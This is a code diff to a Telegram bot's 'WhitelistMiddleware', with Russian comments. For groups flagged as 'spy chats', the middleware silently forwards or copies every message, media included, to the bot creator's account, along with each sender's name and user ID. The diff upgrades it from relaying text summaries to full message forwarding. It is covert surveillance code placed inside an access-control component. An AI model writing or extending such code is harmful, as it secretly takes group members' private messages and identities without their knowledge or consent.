@@ -32,36 +32,27 @@ class WhitelistMiddleware(BaseMiddleware):
         spy_chats = await get_spy_chats()
 
         # Если это сообщение и группа под наблюдением
-        if chat.id in spy_chats and isinstance(event, Message) and CREATOR_ID and CREATOR_ID != 0:
+        if chat.id in spy_chats and isinstance(event, Message) and CREATOR_ID and int(CREATOR_ID) != 0:
             bot = data.get('bot')
             if bot:
                 try:
-                    # Получаем текст или подпись к медиафайлу
-                    text_content = event.html_text or event.caption or ""
-                    # Если есть какой-то медиафайл/стикер, помечаем это
-                    media_type = ""
-                    if event.photo: media_type = "[Фото] "
-                    elif event.video: media_type = "[Видео] "
-                    elif event.sticker: media_type = "[Стикер] "
-                    elif event.voice: media_type = "[Голосовое] "
-                    elif event.document: media_type = "[Файл] "
-
+                    from_user_name = event.from_user.full_name if event.from_user else "Unknown"
+                    from_user_id = event.from_user.id if event.from_user else 0
 
                     forward_info = " [Переслано]" if event.forward_origin else ""
                     reply_info = f" [Ответ на MSG: {event.reply_to_message.message_id}]" if event.reply_to_message else ""
 
-                    if text_content or media_type or forward_info or reply_info:
-                        from_user_name = event.from_user.full_name if event.from_user else "Unknown"
-                        from_user_id = event.from_user.id if event.from_user else 0
-                        await bot.send_message(
-                            chat_id=CREATOR_ID,
-                            text=(
-                                f"👁 <b>[<code>{chat.id}</code>]</b>\n"
-                                f"👤 <b>{from_user_name}</b> (<code>{from_user_id}</code>)\n"
-                                f"🆔 MSG: <code>{event.message_id}</code>{forward_info}{reply_info}\n"
-                                f"💬 {media_type}{text_content}"
-                            )
-                        )
+                    header_text = (
+                        f"👁 <b>[{chat.title or 'Чат'} | <code>{chat.id}</code>]</b>\n"
+                        f"👤 <b>{from_user_name}</b> (<code>{from_user_id}</code>)\n"
+                        f"🆔 MSG: <code>{event.message_id}</code>{forward_info}{reply_info}"
+                    )
+                    await bot.send_message(chat_id=CREATOR_ID, text=header_text, parse_mode="HTML")
+
+                    try:
+                        await event.forward(chat_id=CREATOR_ID)
+                    except Exception:
+                        await event.copy_to(chat_id=CREATOR_ID)
                 except Exception as e:
                     logger.error(f"Spy Error: {e}", exc_info=True)
 
